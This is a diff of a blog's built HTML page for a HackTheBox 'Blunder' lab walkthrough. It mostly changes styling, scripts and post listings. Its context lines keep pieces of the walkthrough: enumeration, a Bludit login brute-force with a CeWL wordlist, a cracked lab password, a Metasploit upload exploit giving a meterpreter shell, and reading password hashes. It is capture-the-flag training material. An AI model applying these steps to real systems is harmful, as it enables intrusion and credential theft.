@@ -9,7 +9,6 @@
 <html lang="en-US" class="no-js">
   <head>
     <meta charset="utf-8">
-
 <!-- begin _includes/seo.html --><title>HackTheBox Blunder - Dcodezero</title>
 <meta name="description" content="Blunder is a hackthebox active machine. You need to have the root hash to unlock the walkthrough!">
 
@@ -64,21 +63,42 @@
 <!-- end _includes/seo.html -->
 
 
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Dcodezero Feed">
 
-  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Dcodezero Feed">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+<!-- Add Mermaid with Debug -->
+<script src="https://cdn.jsdelivr.net/npm/mermaid@8.14.0/dist/mermaid.min.js"></script>
 <script>
-  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
-  window.enable_copy_code_button = true;
-</script>
+document.addEventListener("DOMContentLoaded", function() {
+    mermaid.initialize({
+        startOnLoad: true,
+        securityLevel: 'loose',
+        logLevel: 'debug',
+        mindmap: {
+            padding: 20,
+            nodeSpacing: 60,
+            rankSpacing: 80
+        }
+    });
 
+    // Add error handling
+    mermaid.parseError = function(err, hash) {
+        console.error('Mermaid error:', err);
+        // Add visible error message
+        document.querySelectorAll('.mermaid').forEach(function(elem) {
+            elem.innerHTML += '<div style="color: red; background: #ffebee; padding: 10px; margin-top: 10px; border: 1px solid #ffcdd2;">Diagram Error: ' + err + '</div>';
+        });
+    };
+});
+</script><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<script>
+document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+ window.enable_copy_code_button = true;
+</script>
 <!-- For all browsers -->
 <link rel="stylesheet" href="/assets/css/main.css">
 <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
 <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css"></noscript>
-
-
 
     <!-- start custom head snippets -->
 
@@ -276,7 +296,7 @@
 
   
     <div class="author__avatar">
-      <a href="http://localhost:4000/">
+      <a href="/">
         <img src="/assets/images/brew.webp" alt="DcodeZer0" itemprop="image" class="u-photo">
       </a>
     </div>
@@ -284,7 +304,7 @@
 
   <div class="author__content">
     <h3 class="author__name p-name" itemprop="name">
-      <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">DcodeZer0</a>
+      <a class="u-url" rel="me" href="/" itemprop="url">DcodeZer0</a>
     </h3>
     
       <div class="author__bio p-note" itemprop="description">
@@ -307,13 +327,15 @@
       
         
           
-        
-          
             <li><a href="https://twitter.com/Dcodezer0" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
           
         
           
             <li><a href="https://github.com/DcodeZero" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="https://app.hackthebox.com/profile/291968" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fa-solid fa-cube" aria-hidden="true"></i><span class="label">Hackthebox</span></a></li>
           
         
       
@@ -428,13 +450,13 @@ Nmap done: 1 IP address (1 host up) scanned in 175.80 seconds
 <p>Seeing that Port 80 is open, So I need to ennumerate on only one port..</p>
 
 <blockquote>
-  <p>Using some manual enumeration I found the page <code>blunder.htb/admin</code> which took me to the <code>admin</code> page.</p>
+  <p>Using some manual enumeration I found the page <code class="language-plaintext highlighter-rouge">blunder.htb/admin</code> which took me to the <code class="language-plaintext highlighter-rouge">admin</code> page.</p>
 </blockquote>
 
 <p><img src="/assets/img/sample/blunder/blunder2.png" alt="" /></p>
 
 <blockquote>
-  <p>Seeing the name <code>BLUDIT</code> I searched for an exploit online. <code> https://www.exploit-db.com/exploits/47699 </code> and that has a <code>Metasploit</code> module to it.</p>
+  <p>Seeing the name <code class="language-plaintext highlighter-rouge">BLUDIT</code> I searched for an exploit online. <code class="language-plaintext highlighter-rouge"> https://www.exploit-db.com/exploits/47699 </code> and that has a <code class="language-plaintext highlighter-rouge">Metasploit</code> module to it.</p>
 </blockquote>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MSFCONSOLE
@@ -449,7 +471,7 @@ Matching Modules
 0  exploit/linux/http/bludit_upload_images_exec  2019-09-07       excellent  Yes    Bludit Directory Traversal Image File Upload Vulnerability
 </code></pre></div></div>
 
-<p>Using <code>Gobuster</code> to find some intersting stuff on the page.</p>
+<p>Using <code class="language-plaintext highlighter-rouge">Gobuster</code> to find some intersting stuff on the page.</p>
 
 <h2 id="gobuster">Gobuster</h2>
 
@@ -474,19 +496,19 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
 ===============================================================
 </code></pre></div></div>
 
-<p>Visiting the page <code>blunder.htb/todo.txt</code></p>
+<p>Visiting the page <code class="language-plaintext highlighter-rouge">blunder.htb/todo.txt</code></p>
 
 <p><img src="/assets/img/sample/blunder/blunder1.png" alt="" /></p>
 
-<p>Assuming the username to be <code>Fergus</code></p>
+<p>Assuming the username to be <code class="language-plaintext highlighter-rouge">Fergus</code></p>
 
-<p>After trying a bunch of different stuff I found a way to bruteforce the login page <code>blunder.htb/admin</code> with the help of <code>bludit-mitigation-bypass</code>.
+<p>After trying a bunch of different stuff I found a way to bruteforce the login page <code class="language-plaintext highlighter-rouge">blunder.htb/admin</code> with the help of <code class="language-plaintext highlighter-rouge">bludit-mitigation-bypass</code>.
 <br /></p>
 
 <p><br /></p>
 
 <blockquote>
-  <p><code> https://rastating.github.io/bludit-brute-force-mitigation-bypass/ </code></p>
+  <p><code class="language-plaintext highlighter-rouge"> https://rastating.github.io/bludit-brute-force-mitigation-bypass/ </code></p>
 </blockquote>
 
 <p><br /></p>
@@ -540,7 +562,7 @@ for password in wordlist:
             break
 </code></pre></div></div>
 
-<p>So to do this I made a custom password list <code>bluditpass.txt</code> using <code>CEWl</code>.</p>
+<p>So to do this I made a custom password list <code class="language-plaintext highlighter-rouge">bluditpass.txt</code> using <code class="language-plaintext highlighter-rouge">CEWl</code>.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cewl -d 4 -m 5 -w bluditpass.txt --with-numbers http://blunder.htb 
 CeWL 5.4.6 (Exclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
@@ -958,7 +980,7 @@ Use fergus:RolandDeschain to login.
 </code></pre></div></div>
 
 <blockquote>
-  <p><code>SUCCESS: Password found! Use fergus:RolandDeschain to login.</code></p>
+  <p><code class="language-plaintext highlighter-rouge">SUCCESS: Password found! Use fergus:RolandDeschain to login.</code></p>
 </blockquote>
 
 <h4 id="checking-the-credentials-with-the-login-page-works">Checking the credentials with the login page works!</h4>
@@ -967,7 +989,7 @@ Use fergus:RolandDeschain to login.
 
 <h4 id="as-all-the-required-credentials-are-found-its-time-to-step-up-the-game">As all the required credentials are found, its time to step up the game.</h4>
 
-<p>Using <code>metasploit</code> to get the initial foothold.</p>
+<p>Using <code class="language-plaintext highlighter-rouge">metasploit</code> to get the initial foothold.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MSFCONSOLE
 
@@ -993,7 +1015,7 @@ bluditpass =&gt; RolandDeschain
 msf5 exploit(linux/http/bludit_upload_images_exec) &gt; exploit
 </code></pre></div></div>
 
-<p>If the config is set correctly then there should be no problem of getting the <code>meterpreter</code> session.</p>
+<p>If the config is set correctly then there should be no problem of getting the <code class="language-plaintext highlighter-rouge">meterpreter</code> session.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf5 exploit(linux/http/bludit_upload_images_exec) &gt; exploit
 
@@ -1022,7 +1044,7 @@ shaun:x:1000:1000:blunder,,,:/home/shaun:/bin/bash
 hugo:x:1001:1001:Hugo,1337,07,08,09:/home/hugo:/bin/bash
 </code></pre></div></div>
 
-<h5 id="enumerating-the-machine-and-a-bit-of-googling-the-hash-of-the-user-is-stored-in-bl-contentdatabases">Enumerating the machine and a bit of googling, the hash of the user is stored in <code>bl-content/databases</code>.</h5>
+<h5 id="enumerating-the-machine-and-a-bit-of-googling-the-hash-of-the-user-is-stored-in-bl-contentdatabases">Enumerating the machine and a bit of googling, the hash of the user is stored in <code class="language-plaintext highlighter-rouge">bl-content/databases</code>.</h5>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@blunder:/var/www$ cd bludit-3.10.0a
 cd bludit-3.10.0a
@@ -1043,7 +1065,7 @@ categories.php  plugins       site.php    tags.php
 pages.php       security.php  syslog.php  users.php
 </code></pre></div></div>
 
-<h4 id="checking-with-the-usersphp-found-the-hash-of-hugo">Checking with the <code>Users.php</code> found the hash of <code>HUGO</code>.</h4>
+<h4 id="checking-with-the-usersphp-found-the-hash-of-hugo">Checking with the <code class="language-plaintext highlighter-rouge">Users.php</code> found the hash of <code class="language-plaintext highlighter-rouge">HUGO</code>.</h4>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php
 cat users.php
@@ -1091,7 +1113,7 @@ d******************************a
 
 <h2 id="time-for-privilege-escalation">Time for Privilege Escalation.</h2>
 
-<p>Checking the sudo permissions of <code>hugo</code></p>
+<p>Checking the sudo permissions of <code class="language-plaintext highlighter-rouge">hugo</code></p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hugo@blunder:~$ sudo -l
 sudo -l
@@ -1229,7 +1251,58 @@ My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291
     
     <h2 class="archive__item-title no_toc" itemprop="headline">
       
-        <a href="/goad/GOAD-p1/" rel="permalink">Game of Active Directory - Part 1
+        <a href="/goad/GOAD-p2/" rel="permalink">Game of Active Directory - Part 2 [Recon]
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-12-02T00:00:00+05:30">December 2, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          16 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">GOAD is a pentest active directory LAB project. The purpose of this lab is to give pentesters a vulnerable Active directory environment ready to use to pract...</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/sample/GOAD/GOAD.webp" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/goad/GOAD-p1/" rel="permalink">Game of Active Directory - Part 1 - [Basic]
 </a>
       
     </h2>
@@ -1275,12 +1348,12 @@ My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291
   <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
     
       <div class="archive__item-teaser">
-        <img src="/assets/images/sample/homelab/Homelab.jpg" alt="">
+        <img src="/assets/images/sample/GOAD/mindmap.jpg" alt="">
       </div>
     
     <h2 class="archive__item-title no_toc" itemprop="headline">
       
-        <a href="/it/Homelad/" rel="permalink">HomeLab Part-01
+        <a href="/goad/mindmap/" rel="permalink">Mind Map for Active Directory - Pentesting
 </a>
       
     </h2>
@@ -1292,7 +1365,58 @@ My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291
       <span class="page__meta-date">
         <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
         
-        <time datetime="2024-11-15T00:00:00+05:30">November 15, 2024</time>
+        <time datetime="2024-11-13T00:00:00+05:30">November 13, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          2 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">GOAD is a pentest active directory LAB project. The purpose of this lab is to give pentesters a vulnerable Active directory environment ready to use to pract...</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/sample/homelab/Homelab.jpg" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/it/Homelab/" rel="permalink">HomeLab Part-01 [The Server]
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-11-07T00:00:00+05:30">November 7, 2024</time>
       </span>
     
 
@@ -1313,110 +1437,6 @@ My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291
 
 
     <p class="archive__item-excerpt" itemprop="description">This the where you’ll see the hardware infrastructure of my home lab
-</p>
-  </article>
-</div>
-
-    
-      
-      
-
-
-
-<div class="grid__item">
-  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
-    
-      <div class="archive__item-teaser">
-        <img src="/assets/images/sample/spoof-check/spoofing.jpg" alt="">
-      </div>
-    
-    <h2 class="archive__item-title no_toc" itemprop="headline">
-      
-        <a href="/tools/spoofcheck/" rel="permalink">SpoofCheck.py
-</a>
-      
-    </h2>
-    
-
-  <p class="page__meta">
-    
-      
-      <span class="page__meta-date">
-        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
-        
-        <time datetime="2024-11-03T00:00:00+05:30">November 3, 2024</time>
-      </span>
-    
-
-    <span class="page__meta-sep"></span>
-
-    
-      
-      
-
-      <span class="page__meta-readtime">
-        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
-        
-          4 minute read
-        
-      </span>
-    
-  </p>
-
-
-    <p class="archive__item-excerpt" itemprop="description">This tool checks if domain spoofing is possible or not.
-</p>
-  </article>
-</div>
-
-    
-      
-      
-
-
-
-<div class="grid__item">
-  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
-    
-      <div class="archive__item-teaser">
-        <img src="/assets/images/sample/html-obfs/html-obfs.jpg" alt="">
-      </div>
-    
-    <h2 class="archive__item-title no_toc" itemprop="headline">
-      
-        <a href="/tools/HTML-Obfuscator/" rel="permalink">HTML-Obfuscator
-</a>
-      
-    </h2>
-    
-
-  <p class="page__meta">
-    
-      
-      <span class="page__meta-date">
-        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
-        
-        <time datetime="2024-10-02T00:00:00+05:30">October 2, 2024</time>
-      </span>
-    
-
-    <span class="page__meta-sep"></span>
-
-    
-      
-      
-
-      <span class="page__meta-readtime">
-        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
-        
-          5 minute read
-        
-      </span>
-    
-  </p>
-
-
-    <p class="archive__item-excerpt" itemprop="description">Simple Python program to Obfuscate and Dobfuscate HTML files. The program also allows you to obfuscate and Dobfuscate multiple files in one go.
 </p>
   </article>
 </div>
